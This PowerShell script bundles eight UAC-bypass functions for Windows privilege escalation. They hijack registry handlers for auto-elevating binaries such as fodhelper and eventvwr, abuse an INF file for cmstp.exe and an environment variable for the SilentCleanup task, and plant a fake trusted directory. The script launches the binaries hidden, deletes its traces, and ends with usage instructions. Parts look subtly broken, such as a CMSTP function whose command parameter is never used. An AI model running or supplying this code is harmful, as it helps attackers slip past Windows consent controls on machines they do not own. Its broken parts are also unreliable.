<#
.SYNOPSIS
    UAC bypass techniques for Windows privilege escalation.
.DESCRIPTION
    Multiple UAC bypass methods using auto-elevating Windows binaries.
    Each technique is a standalone function.
.PARAMETER Command
    Command to execute in elevated context (default: cmd.exe).
.NOTES
    MITRE ATT&CK: T1548.002 — Bypass User Account Control
    Requires: Medium integrity, user in local Administrators group
    UAC setting: Default (NotifyMe) — NOT AlwaysNotify
#>
param(
    [string]$Command = "cmd.exe"
)

function Invoke-FodhelperBypass {
    param([string]$Cmd = "cmd.exe")
    <# fodhelper.exe auto-elevates and reads HKCU for delegateExecute #>
    $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value $Cmd
    New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 3
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Output "[+] Fodhelper UAC bypass triggered"
}

function Invoke-EventvwrBypass {
    param([string]$Cmd = "cmd.exe")
    <# eventvwr.exe reads HKCU mscfile shell command before HKCR #>
    $regPath = "HKCU:\Software\Classes\mscfile\Shell\Open\command"
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value $Cmd
    Start-Process "C:\Windows\System32\eventvwr.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 3
    Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Output "[+] Eventvwr UAC bypass triggered"
}

function Invoke-CMSTPBypass {
    param([string]$Cmd = "cmd.exe")
    <# CMSTP.exe auto-elevates when loading .inf profiles #>
    $inf = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection,7
[AllUSer_LDIDSection]
"HKLM","SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE","ProfileInstallPath","%UnexpectedError%",""
[Strings]
ServiceName="BypassUAC"
ShortSvcName="BypassUAC"
"@
    $infPath = "$env:TEMP\bypass.inf"
    $inf | Out-File -FilePath $infPath -Encoding ASCII
    $cmstpArgs = "/au `"$infPath`""
    Start-Process "C:\Windows\System32\cmstp.exe" -ArgumentList $cmstpArgs -WindowStyle Hidden
    Start-Sleep -Seconds 2
    Remove-Item $infPath -Force -ErrorAction SilentlyContinue
    Write-Output "[+] CMSTP UAC bypass triggered — send Enter to the consent window"
}

function Invoke-SdcltBypass {
    param([string]$Cmd = "cmd.exe")
    <# sdclt.exe (Backup and Restore) reads HKCU for exefile commands #>
    $regPath = "HKCU:\Software\Classes\exefile\Shell\Open\command"
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value $Cmd
    New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Start-Process "C:\Windows\System32\sdclt.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 3
    Remove-Item "HKCU:\Software\Classes\exefile" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Output "[+] Sdclt UAC bypass triggered"
}

function Invoke-ComputerDefaultsBypass {
    param([string]$Cmd = "cmd.exe")
    <# computerdefaults.exe reads HKCU ms-settings #>
    $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value $Cmd
    New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Start-Process "C:\Windows\System32\computerdefaults.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 3
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Output "[+] ComputerDefaults UAC bypass triggered"
}

function Invoke-SluiBypass {
    param([string]$Cmd = "cmd.exe")
    <# slui.exe (Software Licensing UI) file handler hijack #>
    $regPath = "HKCU:\Software\Classes\exefile\Shell\Open\command"
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value $Cmd
    New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Start-Process "C:\Windows\System32\slui.exe" -ArgumentList "/VERB RunAs /FLAGS 0x40000" -WindowStyle Hidden
    Start-Sleep -Seconds 3
    Remove-Item "HKCU:\Software\Classes\exefile" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Output "[+] Slui UAC bypass triggered"
}

function Invoke-DiskCleanupBypass {
    param([string]$Cmd = "cmd.exe")
    <# DiskCleanup scheduled task runs as high integrity #>
    $env:windir = "cmd.exe /c $Cmd && REM "
    schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" 2>$null
    Start-Sleep -Seconds 2
    $env:windir = "C:\Windows"
    Write-Output "[+] DiskCleanup environment variable bypass triggered"
}

function Invoke-MockTrustedDirBypass {
    param([string]$Cmd = "cmd.exe")
    <# Create a mock trusted directory with trailing space to bypass path checks #>
    $mockDir = "C:\Windows \System32"
    if (-not (Test-Path $mockDir)) {
        New-Item -ItemType Directory -Path "C:\Windows " -Force | Out-Null
        New-Item -ItemType Directory -Path $mockDir -Force | Out-Null
    }
    Copy-Item "C:\Windows\System32\computerdefaults.exe" "$mockDir\computerdefaults.exe" -Force
    $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(Default)" -Value $Cmd
    New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Start-Process "$mockDir\computerdefaults.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 3
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows " -Recurse -Force -ErrorAction SilentlyContinue
    Write-Output "[+] Mock trusted directory UAC bypass triggered"
}

Write-Output @"
[*] UAC Bypass Functions Loaded:
    Invoke-FodhelperBypass      -Cmd "cmd.exe"   # Win 10+, most reliable
    Invoke-EventvwrBypass       -Cmd "cmd.exe"   # Win 7/8/10
    Invoke-CMSTPBypass          -Cmd "cmd.exe"   # Win 10, needs interaction
    Invoke-SdcltBypass          -Cmd "cmd.exe"   # Win 10 1709+
    Invoke-ComputerDefaultsBypass -Cmd "cmd.exe" # Win 10+
    Invoke-SluiBypass           -Cmd "cmd.exe"   # Win 10+
    Invoke-DiskCleanupBypass    -Cmd "cmd.exe"   # Win 10, env var abuse
    Invoke-MockTrustedDirBypass -Cmd "cmd.exe"   # Win 10, trailing space

[*] Check current integrity level:
    whoami /groups | findstr /i "integrity"

[*] To use: dot-source this file then call a function:
    . .\uac_bypass.ps1
    Invoke-FodhelperBypass -Cmd "powershell.exe -ep bypass"
"@
